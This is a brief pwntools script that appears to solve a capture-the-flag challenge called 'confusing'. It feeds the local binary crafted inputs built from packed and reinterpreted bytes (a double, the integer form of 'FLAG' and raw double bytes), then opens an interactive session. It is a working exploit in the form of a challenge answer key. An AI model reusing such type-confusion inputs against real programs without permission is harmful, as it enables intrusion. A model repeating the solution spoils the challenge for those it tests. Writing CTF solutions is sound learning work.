from pwn import *
import struct

conn = process('../publish/confusing')
conn.sendlineafter(b'Give me d: ', str(struct.unpack('d', p16(13337) + b'\xff\xff\xff\xff\xff\xfe')[0]).encode())
conn.sendlineafter(b'Give me s: ', str(u32(b'FLAG')).encode())
conn.sendlineafter(b'Give me f: ', struct.pack('d', 1.6180339887))
conn.interactive()
